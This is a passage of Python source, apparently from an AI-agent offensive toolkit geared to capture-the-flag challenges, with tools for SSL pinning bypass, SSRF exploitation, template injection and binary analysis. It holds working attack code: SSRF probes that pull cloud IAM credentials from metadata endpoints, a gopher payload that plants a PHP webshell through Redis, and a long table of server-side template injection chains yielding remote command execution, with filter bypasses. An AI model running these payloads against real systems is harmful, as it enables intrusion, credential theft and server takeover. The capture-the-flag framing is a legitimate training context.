                    if "correct" in rl or "flag" in rl or "ctf" in rl:
                        break
                    elif "higher" in rl or "too low" in rl:
                        lo = mid + 1
                    elif "lower" in rl or "too high" in rl:
                        hi = mid - 1
                    else:
                        output.append(f"Unexpected response: {resp}")
                        break
            else:
                for line in (script or "").splitlines():
                    chan.send(line + "\n")
                    resp = recv_all(3)
                    output.append(f"Sent {repr(line)}: {resp}")

            chan.close(); c.close()
            return "\n".join(output)
        except Exception as ex:
            return f"Interactive SSH error: {ex}"

    return "Operations: connect, run_command, scp_download, interactive_game"


def tool_ssl_pinning_bypass(operation: str = "frida", target: str = "",
                              package_name: str = "", method: str = "auto") -> str:
    """SSL/certificate pinning bypass for mobile apps.
    Ops: frida (universal Frida bypass script), objection (objection framework),
    apktool_patch (patch smali for network_security_config), ios_frida (iOS bypass),
    custom (custom Frida hook for specific pinning implementation)."""

    # Frida bypass scripts - Claude generates these per-target

    if operation == "frida":
        if "ios" in method.lower() or "ios" in (package_name or "").lower():
            script = FRIDA_IOS_BYPASS
            cmd = f"frida -U -l ios_ssl_bypass.js -f {package_name or 'com.target.app'} --no-pause"
        else:
            script = FRIDA_ANDROID_BYPASS
            cmd = f"frida -U -l ssl_bypass.js -f {package_name or 'com.target.app'} --no-pause"
        return f"Save as ssl_bypass.js:\n\n{script}\n\nRun:\n  {cmd}\n\nThen proxy traffic through mitmproxy/Burp on port 8080"

    if operation == "objection":
        pkg = package_name or target
        return (f"Objection SSL pinning bypass:\n\n"
                f"# Install: pip3 install objection\n"
                f"# Start Frida server on device first\n\n"
                f"# Android:\n"
                f"objection -g {pkg} explore\n"
                f"> android sslpinning disable\n\n"
                f"# iOS:\n"
                f"objection -g {pkg} explore\n"
                f"> ios sslpinning disable\n\n"
                f"# Inject into running process:\n"
                f"objection -g {pkg} explore --startup-command 'android sslpinning disable'\n\n"
                f"# Combined with proxy:\n"
                f"# 1. Set device proxy to 192.168.x.x:8080 (mitmproxy)\n"
                f"# 2. Run: objection -g {pkg} explore -s 'android sslpinning disable'\n"
                f"# 3. Traffic flows through mitmproxy plaintext")

    if operation == "apktool_patch":
        return f"[apktool_patch] Claude handles this directly — use execute_python/execute_shell to run the technique"

    if operation == "custom":
        return f"[custom] Claude handles this directly — use execute_python/execute_shell to run the technique"

    return "Operations: frida (Android/iOS universal bypass), objection, apktool_patch, ios_frida, custom"


def tool_ssrf_chain(target_url: str, operation: str = "probe",
                     param: str = "url", method: str = "GET",
                     headers: dict = None, cookies: dict = None,
                     internal_target: str = "", custom_payload: str = "") -> str:
    """SSRF automated exploitation: probe (detect), cloud_metadata (AWS/GCP/Azure IMDS),
    port_scan (internal), protocol_smuggle (gopher/dict/file), redis_rce, escalate (full chain)."""

    # CLOUD_PAYLOADS/BYPASS_SCHEMES removed - Claude generates these

    if operation == "probe":
        code = f"""
import requests, time
requests.packages.urllib3.disable_warnings()
url = {repr(target_url)}
param = {repr(param)}
method = {repr(method.upper())}
hdrs = {repr(headers or {})}
cks = {repr(cookies or {})}
results = []

payloads = [
    ("http://169.254.169.254/latest/meta-data/", "AWS IMDS v1"),
    ("http://metadata.google.internal/computeMetadata/v1/", "GCP metadata"),
    ("http://169.254.169.254/metadata/instance", "Azure IMDS"),
    ("http://127.0.0.1", "localhost"),
    ("http://127.0.0.1:6379", "Redis"),
    ("http://127.0.0.1:9200", "Elasticsearch"),
    ("http://127.0.0.1:8080", "Internal web"),
    ("file:///etc/passwd", "file:// LFI"),
    ("dict://127.0.0.1:6379/info", "Dict-Redis"),
]

for ssrf_url, label in payloads:
    try:
        if method == 'GET':
            sep = '&' if '?' in url else '?'
            r = requests.get(url + sep + param + '=' + ssrf_url,
                             headers=hdrs, cookies=cks, timeout=5, verify=False)
        else:
            r = requests.post(url, data={{param: ssrf_url}},
                              headers=hdrs, cookies=cks, timeout=5, verify=False)
        body = r.text[:300]
        if any(x in body.lower() for x in ['ami-id','instance-id','computemetadata',
                                              'principalid','root:','redis_version',
                                              'elasticsearch','took']):
            results.append(f"[HIT] {{label}}: {{repr(body[:200])}}")
        elif r.status_code not in (403,404,400,502,504):
            results.append(f"[?] {{label}}: status={{r.status_code}} len={{len(r.text)}}")
    except requests.exceptions.Timeout:
        results.append(f"[TIMEOUT] {{label}} (possible blind SSRF)")
    except Exception as ex:
        results.append(f"[ERR] {{label}}: {{ex}}")
print('\\n'.join(results) if results else 'No SSRF detected')
"""
        return tool_execute_python(code, timeout=45)

    if operation == "cloud_metadata":
        cloud = custom_payload or "aws_v1"
        payload_url = CLOUD_PAYLOADS.get(cloud, CLOUD_PAYLOADS["aws_v1"])
        code = f"""
import requests
requests.packages.urllib3.disable_warnings()
url={repr(target_url)}; param={repr(param)}; method={repr(method.upper())}
hdrs={repr(headers or {})}; cks={repr(cookies or {})}
# Try multiple cloud metadata endpoints
endpoints = {{
    "AWS IMDSv1 root": "http://169.254.169.254/latest/meta-data/",
    "AWS IAM creds": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "AWS user-data": "http://169.254.169.254/latest/user-data",
    "GCP token": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    "GCP full": "http://metadata.google.internal/computeMetadata/v1/?recursive=true",
    "Azure instance": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
}}
for label, ep in endpoints.items():
    try:
        extra_hdrs = {{'Metadata': 'true', 'X-aws-ec2-metadata-token-ttl-seconds': '21600'}}
        if method == 'GET':
            sep = '&' if '?' in url else '?'
            r = requests.get(url + sep + param + '=' + ep,
                             headers={{**hdrs,**extra_hdrs}}, cookies=cks, timeout=8, verify=False)
        else:
            r = requests.post(url, data={{param: ep}}, headers={{**hdrs,**extra_hdrs}}, cookies=cks, timeout=8, verify=False)
        if r.status_code == 200 and len(r.text) > 10:
            print(f"[HIT] {{label}}:\\n{{r.text[:500]}}")
    except Exception as ex:
        print(f"[ERR] {{label}}: {{ex}}")
"""
        return tool_execute_python(code, timeout=40)

    if operation == "port_scan":
        base = internal_target or "127.0.0.1"
        common_ports = [22, 80, 443, 3306, 5432, 6379, 8080, 8443, 9200, 27017, 11211, 2181, 5601, 4444]
        code = f"""
import requests, time
requests.packages.urllib3.disable_warnings()
url={repr(target_url)}; param={repr(param)}; method={repr(method.upper())}
hdrs={repr(headers or {})}; cks={repr(cookies or {})}
base={repr(base)}; ports={common_ports}
open_ports = []
for port in ports:
    target = f"http://{{base}}:{{port}}"
    try:
        start = time.time()
        if method == 'GET':
            sep = '&' if '?' in url else '?'
            r = requests.get(url + sep + param + '=' + target,
                             headers=hdrs, cookies=cks, timeout=3, verify=False)
        else:
            r = requests.post(url, data={{param: target}}, headers=hdrs, cookies=cks, timeout=3, verify=False)
        elapsed = time.time() - start
        if r.status_code not in (502,504) or elapsed < 2.5:
            open_ports.append(f"{{port}}: status={{r.status_code}} time={{elapsed:.2f}}s len={{len(r.text)}}")
    except requests.exceptions.Timeout:
        pass
    except Exception as ex:
        pass
print(f"Open/responsive ports on {{base}}:")
for p in open_ports: print(f"  {{p}}")
if not open_ports: print("No open ports found with SSRF probe")
"""
        return tool_execute_python(code, timeout=60)

    if operation == "redis_rce":
        cmd = custom_payload or "id"
        webshell_path = "/var/www/html/shell.php"
        gopher = ("gopher://127.0.0.1:6379/_"
                  "%2A1%0D%0A%248%0D%0Aflushall%0D%0A"
                  "%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2430%0D%0A%0A%0A%3C%3Fphp%20system%28%24_GET%5B%27c%27%5D%29%3B%3F%3E%0A%0A%0D%0A"
                  "%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2415%0D%0A/var/www/html%0D%0A"
                  "%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A"
                  "%2A1%0D%0A%244%0D%0Asave%0D%0A")
        return (f"Redis SSRF→RCE via Gopher protocol:\n\n"
                f"Step 1: Send gopher payload via SSRF param:\n"
                f"  {param}={gopher}\n\n"
                f"Step 2: Execute command:\n"
                f"  GET {webshell_path.replace('/var/www/html','http://target')}?c={cmd}\n\n"
                f"Alternative: dict:// probe first:\n"
                f"  {param}=dict://127.0.0.1:6379/info\n\n"
                f"Memcached SSRF: gopher://127.0.0.1:11211/_stats\n"
                f"Elasticsearch: http://127.0.0.1:9200/_cat/indices")

    if operation == "protocol_smuggle":
        return f"[protocol_smuggle] Claude handles this directly — use execute_python/execute_shell to run the technique"

    return "Operations: probe, cloud_metadata, port_scan, redis_rce, protocol_smuggle"


def tool_ssti_rce(operation: str = "detect", engine: str = "auto",
                   target_url: str = "", param: str = "", method: str = "GET",
                   headers: dict = None, cookies: dict = None,
                   custom_payload: str = "") -> str:
    """SSTI detection + engine-specific RCE escalation with sandbox escape chains."""

    # ── Detection payloads (polymath probes) ─────────────────────────────────
    PROBES = [
        ("{{7*7}}", "49"),          # Jinja2/Twig/Tornado
        ("#{7*7}", "49"),           # Ruby ERB, Mako
        ("${7*7}", "49"),           # FreeMarker, Velocity
        ("{{7*'7'}}", "7777777"),   # Jinja2 (not Twig → 49)
        ("<%=7*7%>", "49"),         # ERB
        ("<#assign x=7*7>${x}", "49"),  # FreeMarker
        ("#set($x=7*7)${x}", "49"), # Velocity
        ("[#assign x=7*7][${x}]", "[49]"),  # FreeMarker (alt)
    ]

    ENGINE_RCE = {
        "jinja2": [
            # Classic MRO chain
            "{{''.__class__.__mro__[1].__subclasses__()[<N>].__init__.__globals__['os'].popen('{cmd}').read()}}",
            # config object (Flask)
            "{{config.__class__.__init__.__globals__['os'].popen('{cmd}').read()}}",
            # cycler (Jinja2 ≥ 2.11)
            "{{cycler.__init__.__globals__.os.popen('{cmd}').read()}}",
            # joiner
            "{{joiner.__init__.__globals__.os.popen('{cmd}').read()}}",
            # namespace (Jinja2 ≥ 2.10)
            "{{namespace.__init__.__globals__.os.popen('{cmd}').read()}}",
            # Bypass with request.application (Flask)
            "{{request.application.__globals__.__builtins__.__import__('os').popen('{cmd}').read()}}",
            # attr filter bypass for dot-filtered input
            "{{()|attr('__class__')|attr('__base__')|attr('__subclasses__')()|...|attr('popen')('{cmd}')|attr('read')()}}",
            # [].__class__.__base__ path for older Jinja
            "{{[].__class__.__base__.__subclasses__()[<N>]('ls',shell=True,stdout=-1).communicate()}}",
        ],
        "jinja2_sandbox": [
            # Sandbox escapes (filter bypasses)
            # lipsum function (built-in globals exposure)
            "{{lipsum.__globals__.os.popen('{cmd}').read()}}",
            # _getframe / sys bypass
            "{{().__class__.__mro__[1].__subclasses__()[<N>].__init__.__globals__['__builtins__']['__import__']('os').popen('{cmd}').read()}}",
            # Format string bypass for underscores
            "{{'%c'|format(95)*2 ~ 'class' ~ '%c'|format(95)*2}}",
            # Bypass with |string|list|... chains when . and _ filtered
            "{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|...|attr('popen')('{cmd}')}}",
            # Werkzeug dev server console
            "# Werkzeug debug PIN bypass: check stderr for PIN, use /console",
        ],
        "twig": [
            "{{['id']|filter('system')}}",
            "{{['id','0']|sort('system')}}",
            "{{app.request.server.get('HTTP_ACCEPT_LANGUAGE')}}",  # info leak
            "{{'id'|exec}}",
            "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('{cmd}')}}",
            "{{['{cmd}']|map('system')}}",  # Twig 3.x
        ],
        "freemarker": [
            "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${{ex('{cmd}')}}",
            "${{\"freemarker.template.utility.ObjectConstructor\"?new()(\"java.lang.Runtime\").exec('{cmd}')}}",
            # API exposure via ?api
            "${{product?api.getClass().forName('java.lang.Runtime').getMethod('exec',String.class).invoke(product?api.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'{cmd}')}}",
        ],
        "velocity": [
            "#set($rt=$class.forName('java.lang.Runtime'))#set($ex=$rt.getRuntime().exec('{cmd}'))#set($exout=$ex.getInputStream())#set($bytes=[])$exout.read($bytes)",
            "#set($x='')##\n#set($rt=$x.class.forName('java.lang.Runtime'))...",
            "#foreach($i in [1..$out.class.forName('java.lang.Runtime').getRuntime().exec('{cmd}')])",
        ],
        "mako": [
            "${{__import__('os').popen('{cmd}').read()}}",
            "<%\nimport os\nx=os.popen('{cmd}').read()\n%>${{x}}",
            "${{self.module.__builtins__.__import__('os').popen('{cmd}').read()}}",
        ],
        "erb": [
            "<%= `{cmd}` %>",
            "<%= IO.popen('{cmd}').read %>",
            "<%= system('{cmd}') %>",
        ],
        "tornado": [
            "{{% import os %}}{{{{{{% raw os.popen('{cmd}').read() %}}}}}}",
            "{{{{escape.xhtml_escape.__globals__['os'].popen('{cmd}').read()}}}}",
        ],
        "smarty": [
            "{system('{cmd}')}",
            "{php}echo `{cmd}`;{/php}",
            "{{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php system('{cmd}');?>\",self::clearConfig())}}",
        ],
        "handlebars": [
            # Handlebars prototype pollution → RCE
            "{{{{#with \"s\" as |string|}}}}\n  {{{{#with \"e\"}}}}\n    {{{{#with split as |conslist|}}}}\n      {{{{this.pop}}}}\n      {{{{this.push (lookup string.sub \"constructor\")}}}}\n      {{{{this.pop}}}}\n      {{{{#with string.split as |codelist|}}}}\n        {{{{this.pop}}}}\n        {{{{this.push \"return require('child_process').execSync('{cmd}').toString();\"}}}}\n        {{{{this.pop}}}}\n        {{{{#each conslist}}}}\n          {{{{#with (string.sub.apply 0 codelist)}}}}\n            {{{{this}}}}\n          {{{{/with}}}}\n        {{{{/each}}}}\n      {{{{/with}}}}\n    {{{{/with}}}}\n  {{{{/with}}}}\n{{{{/with}}}}",
        ],
        "pebble": [
            "{{% set cmd = '{cmd}' %}}{{% set rt = ''.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null) %}}{{% set p = rt.exec(cmd) %}}...",
        ],
    }

    cmd = "id"  # default probe command

    if operation == "payloads":
        eng = engine.lower() if engine != "auto" else "jinja2"
        chains = ENGINE_RCE.get(eng, ENGINE_RCE.get("jinja2", []))
        lines = [f"=== SSTI RCE payloads for {eng} (cmd='{custom_payload or cmd}') ==="]
        cmd_val = custom_payload or cmd
        for i, p in enumerate(chains, 1):
            lines.append(f"\n[{i}] {p.replace('{cmd}', cmd_val)}")
        lines.append("\n=== Engine detection probes ===")
        for probe, expected in PROBES[:5]:
            lines.append(f"  Inject: {probe}  → expect: {expected}")
        return "\n".join(lines)

    if operation == "detect" and target_url:
        results = []
        import urllib.parse as _up
        hdrs = headers or {}
        cks = cookies or {}
        detected_engine = None
        for probe, expected in PROBES:
            probe_url = target_url
            probe_data = None
            if param:
                if method.upper() == "GET":
                    sep = "&" if "?" in target_url else "?"
                    probe_url = target_url + sep + param + "=" + _up.quote(probe)
                else:
                    probe_data = {param: probe}
            try:
                resp = tool_http_request(probe_url, method, hdrs, probe_data, None, cks,
                                         follow_redirects=True, verify_ssl=False, timeout=10)
                if expected in resp:
                    results.append(f"[VULNERABLE] Probe '{probe}' → expected '{expected}' found!")
                    # Fingerprint engine
                    if probe == "{{7*'7'}}" and "7777777" in resp:
                        detected_engine = "jinja2"
                    elif probe == "{{7*'7'}}" and "49" in resp:
                        detected_engine = "twig"
                    elif probe == "${7*7}" and "49" in resp:
                        detected_engine = "freemarker_or_velocity"
                    elif probe == "<%=7*7%>" and "49" in resp:
                        detected_engine = "erb"
                    break
                else:
                    results.append(f"  Probe '{probe}' → no match (got {len(resp)} bytes)")
            except Exception as ex:
                results.append(f"  Probe '{probe}' → error: {ex}")
        if detected_engine:
            results.append(f"\nDetected engine: {detected_engine}")
            results.append(f"Use operation='escalate', engine='{detected_engine}' to get RCE payloads")
        return "\n".join(results) or "No SSTI detected with standard probes"

    if operation == "escalate":
        eng = engine.lower() if engine != "auto" else "jinja2"
        cmd_val = custom_payload or "id"
        chains = ENGINE_RCE.get(eng, [])
        if not chains:
            # fuzzy match
            for key in ENGINE_RCE:
                if key.startswith(eng[:4]):
                    chains = ENGINE_RCE[key]; eng = key; break
        if not chains:
            return f"No RCE chains for engine '{engine}'. Available: {list(ENGINE_RCE.keys())}"
        lines = [f"=== {eng} RCE escalation chains (cmd='{cmd_val}') ===",
                 "Try each payload in order — earlier ones work on unpatched installs,",
                 "later ones bypass common WAF/filters:\n"]
        for i, chain in enumerate(chains, 1):
            lines.append(f"[{i}] {chain.replace('{cmd}', cmd_val)}\n")
        # Add subclass finder for Jinja2
        if "jinja2" in eng:
            lines.append("\n=== Jinja2 subclass index finder (paste into SSTI) ===")
            lines.append("{{''.__class__.__mro__[1].__subclasses__()}}")
            lines.append("# Find Popen/subprocess index with:")
            lines.append("{% for i, c in enumerate(''.__class__.__mro__[1].__subclasses__()) %}")
            lines.append("  {% if 'Popen' in c.__name__ or 'subprocess' in c.__module__ %}")
            lines.append("    {{i}}: {{c}}")
            lines.append("  {% endif %}{% endfor %}")
        return "\n".join(lines)

    if operation == "list_engines":
        return "Supported engines: " + ", ".join(ENGINE_RCE.keys())

    return (f"SSTI RCE tool. Operations:\n"
            f"  detect   — probe URL for SSTI (requires target_url + param)\n"
            f"  escalate — get RCE chains for a known engine (requires engine=)\n"
            f"  payloads — dump all payloads for engine without making requests\n"
            f"  list_engines — list supported template engines\n"
            f"Supported engines: {', '.join(ENGINE_RCE.keys())}")


def tool_swagger_fuzz(target_url: str, operation: str = "discover",
                      endpoint: str = "", method: str = "GET",
                      output_path: str = "", headers: dict = None,
                      cookies: dict = None) -> str:
    """Fetch and parse OpenAPI/Swagger specs, enumerate all endpoints, test each for
    sensitive data exposure. Covers Spring Boot Actuator (/heapdump, /env, /beans).
    Ops: discover (probe common spec paths), parse_spec (list all paths+methods),
    test_all (call every GET endpoint), download_artifact (stream binary to file)."""

    import urllib.request

    base = target_url.rstrip("/")
    hdrs = headers or {}
    cks  = cookies or {}

    SPEC_PATHS = [
        "/api-docs", "/v2/api-docs", "/v3/api-docs",
        "/swagger.json", "/swagger.yaml",
        "/openapi.json", "/openapi.yaml",
        "/swagger-ui/swagger.json",
        "/actuator", "/actuator/mappings",
        "/api/swagger.json", "/api/openapi.json",
    ]

    def _get(url, stream=False):
        try:
            import requests
            r = requests.get(url, headers=hdrs, cookies=cks,
                             timeout=10, verify=False, stream=stream)
            return r
        except ImportError:
            pass
        try:
            req = urllib.request.Request(url, headers=hdrs)
            with urllib.request.urlopen(req, timeout=10) as r:
                return type("R", (), {
                    "status_code": r.status,
                    "text": r.read().decode(errors="replace"),
                    "content": r.read(),
                    "headers": dict(r.headers)
                })()
        except Exception as ex:
            return type("R", (), {"status_code": 0, "text": str(ex), "content": b"", "headers": {}})()

    if operation == "discover":
        found = []
        for path in SPEC_PATHS:
            url = base + path
            r = _get(url)
            ct = getattr(r, "headers", {}).get("content-type", "") or ""
            if r.status_code in (200, 206):
                preview = (r.text if hasattr(r, "text") else "")[:200]
                found.append(f"[{r.status_code}] {url}\n    Content-Type: {ct}\n    Preview: {preview!r}")
        return "\n\n".join(found) if found else f"No spec endpoints found on {base}"

    if operation == "parse_spec":
        # Find spec first
        spec = None
        for path in SPEC_PATHS[:8]:
            r = _get(base + path)
            if r.status_code == 200:
                try:
                    spec = json.loads(r.text)
                    break
                except:
                    try:
                        import yaml
                        spec = yaml.safe_load(r.text)
                        break
                    except: pass
        if not spec:
            return "No parseable spec found — run discover first"
        paths = spec.get("paths", {})
        lines = [f"Spec: {spec.get('info',{}).get('title','?')} v{spec.get('info',{}).get('version','?')}",
                 f"Total endpoints: {len(paths)}"]
        for p, methods_obj in sorted(paths.items()):
            for m, detail in (methods_obj or {}).items():
                summary = (detail or {}).get("summary", "") if isinstance(detail, dict) else ""
                lines.append(f"  {m.upper():6} {p}  — {summary}")
        return "\n".join(lines)

    if operation == "test_all":
        spec = None
        for path in SPEC_PATHS[:8]:
            r = _get(base + path)
            if r.status_code == 200:
                try: spec = json.loads(r.text); break
                except: pass
        if not spec:
            return "No parseable spec found — run discover first"
        paths = list(spec.get("paths", {}).keys())
        results = []
        for p in paths[:50]:  # cap at 50 endpoints
            url = base + p
            r = _get(url)
            ct = getattr(r, "headers", {}).get("content-type", "") or ""
            preview = (r.text if hasattr(r, "text") else "")[:300]
            interesting = any(kw in preview.lower() for kw in
                              ["flag","ctf","secret","password","token","key","heap","dump","env"])
            tag = " *** INTERESTING ***" if interesting else ""
            results.append(f"[{r.status_code}] GET {url}{tag}\n    {ct}\n    {preview!r}")
        return "\n\n".join(results)

    if operation == "download_artifact":
        if not endpoint:
            return "Provide endpoint= (e.g. /actuator/heapdump)"
        out = output_path or f"/tmp/artifact_{int(time.time())}.bin"
        url = base + endpoint
        try:
            import requests
            r = requests.get(url, headers=hdrs, cookies=cks,
                             timeout=60, verify=False, stream=True)
            total = 0
            with open(out, "wb") as f:
                for chunk in r.iter_content(65536):
                    f.write(chunk); total += len(chunk)
            log("sys", f"[swagger_fuzz] downloaded {total} bytes → {out}", "dim")
            # quick flag scan
            grep = _shell(f"strings '{out}' | grep -iE 'picoCTF|flag{{|ctf{{' | head -20", timeout=10)
            return f"Downloaded {total} bytes → {out}\nFlag scan:\n{grep}"
        except Exception as ex:
            return f"Download error: {ex}"

    return "Operations: discover, parse_spec, test_all, download_artifact"


def tool_swift_decompile(binary_path: str = "", ipa_path: str = "",
                          operation: str = "analyze") -> str:
    """iOS Swift binary analysis.
    Ops: analyze (file info + encryption check), demangle (Swift symbol demangling),
    class_hierarchy (reconstruct class structure), strings (Swift string literals),
    protocols (list implemented protocols), frida_hooks (generate Swift-aware Frida hooks)."""

    sp = ""
    if ipa_path:
        ip = _w2l(ipa_path) if (IS_WINDOWS and USE_WSL) else ipa_path
        # Extract binary from IPA
        out = f"/tmp/swift_ipa_{int(time.time())}"
        _shell(f"mkdir -p '{out}' && unzip -q '{ip}' -d '{out}' 2>/dev/null", timeout=20)
        sp_list = _shell(f"find '{out}' -name '*.app' -type d | head -1", timeout=5).strip()
        if sp_list:
            bin_name = _shell(f"ls '{sp_list}' | grep -v '\\.' | head -1", timeout=5).strip()
            sp = f"{sp_list}/{bin_name}"
    elif binary_path:
        sp = _w2l(binary_path) if (IS_WINDOWS and USE_WSL) else binary_path

    if not sp:
        return "Provide binary_path or ipa_path"

    if operation == "analyze":
        return _shell(f"file '{sp}' 2>/dev/null && "
                     f"echo '--- Encryption check ---' && "
                     f"otool -l '{sp}' 2>/dev/null | grep -A3 'LC_ENCRYPTION_INFO' && "
                     f"echo '--- Swift version ---' && "
                     f"strings '{sp}' | grep -E 'Swift [0-9]|swiftlang' | head -5 && "
                     f"echo '--- Security ---' && "
                     f"checksec --file='{sp}' 2>/dev/null || "
                     f"otool -l '{sp}' 2>/dev/null | grep -E 'PIE|STACK' | head -5",
                     timeout=20)

    if operation == "demangle":
        return _shell(f"nm '{sp}' 2>/dev/null | grep '_\\$s' | "
                     f"awk '{{print $3}}' | swift-demangle 2>/dev/null | head -50 || "
                     f"nm '{sp}' 2>/dev/null | grep '_\\$s' | head -30 | "
                     f"while read addr type sym; do "
                     f"  echo \"$addr $type $(echo $sym | xcrun swift-demangle 2>/dev/null || echo $sym)\"; "
                     f"done | head -30",
                     timeout=30)

    if operation == "class_hierarchy":
        return _shell(f"class-dump --arch arm64 '{sp}' 2>/dev/null | head -100 || "
                     f"nm '{sp}' 2>/dev/null | grep -E 'metaclass|OBJC_CLASS' | "
                     f"awk '{{print $3}}' | sed 's/_OBJC_CLASS_\\$_//' | head -40",
                     timeout=20)

    if operation == "strings":
        return _shell(f"strings '{sp}' | grep -vE '^[^[:print:]]|^\\.' | "
                     f"grep -iE 'flag|ctf|key|secret|password|token|auth' | head -30 && "
                     f"echo '--- All non-trivial strings ---' && "
                     f"strings -n 8 '{sp}' | grep -v '^[_@$.]' | head -60",
                     timeout=15)

    if operation == "frida_hooks":
        return (f"Swift-aware Frida hooks:\n\n"
                f"// Hook all Swift methods on a class\n"
                f"var ClassName = ObjC.classes['ClassName'];\n"
                f"if (ClassName) {{\n"
                f"  ObjC.choose(ClassName, {{\n"
                f"    onMatch: function(obj) {{\n"
                f"      console.log('Found instance:', obj);\n"
                f"    }},\n"
                f"    onComplete: function() {{}}\n"
                f"  }});\n"
                f"}}\n\n"
                f"// Swift function hooking (by mangled name)\n"
                f"// First demangle: nm binary | grep _\\$s | head -20\n"
                f"var swiftFunc = Module.findExportByName(null, '_\\$s<mangled_name>');\n"
                f"if (swiftFunc) {{\n"
                f"  Interceptor.attach(swiftFunc, {{\n"
                f"    onEnter: function(args) {{ console.log('Swift func called', args[0]); }},\n"
                f"    onLeave: function(retval) {{ retval.replace(1); }}\n"
                f"  }});\n"
                f"}}")

    return "Operations: analyze, demangle, class_hierarchy, strings, protocols, frida_hooks"


def tool_vm_devirt(binary_path: str, operation: str = "detect",
                    handler_addr: str = "", opcode_map: dict = None) -> str:
    """VM devirtualization / deobfuscation for VMProtect/Themida/custom VM.
    Ops: detect (identify VM type + handler table), trace (trace execution to build opcode map),
    lift (lift traced bytecode to C pseudocode), devirt_skeleton (custom VM analysis script)."""

    bp = _w2l(binary_path) if (IS_WINDOWS and USE_WSL) else binary_path

    if operation == "detect":
        code = f"""
import subprocess, re
bp = {repr(bp)}
print("=== Commercial protector detection ===")
r = subprocess.run(['strings', bp], capture_output=True, text=True)
s = r.stdout
sigs = {{
    'VMProtect':   ['VMProtect', 'vmp_', '.vmp0', '.vmp1', 'vmp_begin', 'vmp_end'],
    'Themida':     ['Themida', 'WinLicense', 'TFIDO', 'OREANS'],
    'Enigma':      ['Enigma Protector', 'enigma_', '.enigma'],
    'ASProtect':   ['ASProtect', 'aspr'],
    'Obsidium':    ['Obsidium'],
    'Safengine':   ['Safengine'],
    'Code Virtualizer': ['CODE_VIRTUALIZER', 'CV_VIRTUALIZER'],
}}
for name, markers in sigs.items():
    if any(m in s for m in markers):
        print(f"[!] Detected: {{name}}")
# Entropy scan for packed sections
r2 = subprocess.run(['objdump', '-h', bp], capture_output=True, text=True)
print()
print("=== Section analysis ===")
for line in r2.stdout.split('\\n'):
    if 'vmp' in line.lower() or 'themida' in line.lower() or 'oreans' in line.lower():
        print(f"  Suspicious section: {{line.strip()}}")
print()
print("=== Custom VM detection heuristics ===")
r3 = subprocess.run(['objdump', '-d', bp], capture_output=True, text=True, timeout=30)
asm = r3.stdout
# Dispatcher pattern: large switch/jmp-table
jmps = len(re.findall(r'jmp\\s+\\*', asm))
mov_dispatches = len(re.findall(r'movzx.*\\[', asm))
print(f"  Indirect JMPs (jmp [reg+offset]): {{jmps}}")
print(f"  MOVZX from memory (potential opcode fetch): {{mov_dispatches}}")
if jmps > 10:
    print("  [!] Many indirect jumps — possible VM dispatcher")
"""
        return tool_execute_python(code, timeout=30)

    if operation == "trace":
        return (f"VM handler tracing approach:\n\n"
                f"1. Frida-based tracer (dynamic):\n"
                f"   Use frida_trace with script to trace all basic block transitions\n"
                f"   frida_trace('{binary_path}', script='''\n"
                f"     Stalker.follow(Process.mainThread().id, {{\n"
                f"       events: {{ compile: true }},\n"
                f"       onReceive(events) {{\n"
                f"         const bbs = Stalker.parse(events, {{stringify: true}});\n"
                f"         bbs.forEach(bb => send(bb));\n"
                f"       }}\n"
                f"     }});\n"
                f"   ''')\n\n"
                f"2. PIN-based tracer:\n"
                f"   pin -t inscount0.so -- {binary_path}\n"
                f"   Builds full execution trace\n\n"
                f"3. Unicorn emulation (for isolated VM handlers):\n"
                f"   unicorn_emulate(arch='x86_64', code=handler_bytes_hex)\n"
                f"   Step through handler, log state transitions\n\n"
                f"4. QEMU user-mode + GDB:\n"
                f"   qemu-x86_64 -g 1234 {binary_path}\n"
                f"   gdb -ex 'target remote :1234' -ex 'b *{handler_addr}'\n"
                f"   Log: RIP, handler_opcode, virtual registers at each dispatch\n\n"
                f"Analysis goal: build opcode_map = {{bytecode_byte: native_semantics}}")

    if operation == "lift":
        if not opcode_map:
            return ("Provide opcode_map={{byte_val: 'semantic'}} from trace analysis.\n"
                    "Example: {{0x01: 'PUSH reg', 0x02: 'POP reg', 0x10: 'ADD', 0x11: 'SUB',...}}\n"
                    "Then use custom_cpu_emulate() to write a full interpreter.")
        lines = [f"VM lift: opcode map has {len(opcode_map)} entries\n"]
        for byte_val, semantic in sorted(opcode_map.items())[:20]:
            lines.append(f"  {hex(byte_val)}: {semantic}")
        lines.append("\nGenerate custom CPU emulator:")
        lines.append("  custom_cpu_emulate(code=<your_vm_interpreter>, operation='run')")
        return "\n".join(lines)

    if operation == "devirt_skeleton":
        return f"[devirt_skeleton] Claude handles this directly — use execute_python/execute_shell to run the technique"

    return "Operations: detect, trace, lift, devirt_skeleton"


def tool_windows_forensics(path: str, operation: str = "all",
                             output_dir: str = "", keyword: str = "") -> str:
    """Windows artifact forensics: registry (SAM/SYSTEM/SOFTWARE hive parsing),
    event_logs (EVTX parsing), prefetch, lnk_files, shellbags, amcache, browser_history,
    credentials (cached creds, LSA secrets), timeline_all."""

    wp = _w2l(path) if (IS_WINDOWS and USE_WSL) else path
    out = output_dir or f"/tmp/winforensics_{int(time.time())}"

    if operation in ("all", "registry"):
        code = f"""
import subprocess, os, sys
wp = {repr(wp)}
# Try regipy (pip install regipy), then regripper fallback
hives = ['SAM', 'SYSTEM', 'SOFTWARE', 'SECURITY', 'NTUSER.DAT']
found_hives = []
for hive in hives:
    # Search for hive file
    r = subprocess.run(['find', wp, '-name', hive, '-type', 'f'],
                       capture_output=True, text=True, timeout=10)
    for hive_path in r.stdout.strip().split('\\n'):
        if hive_path:
            found_hives.append((hive, hive_path))
            print(f"Found: {{hive_path}}")
if not found_hives:
    print(f"No registry hives found under {{wp}}")
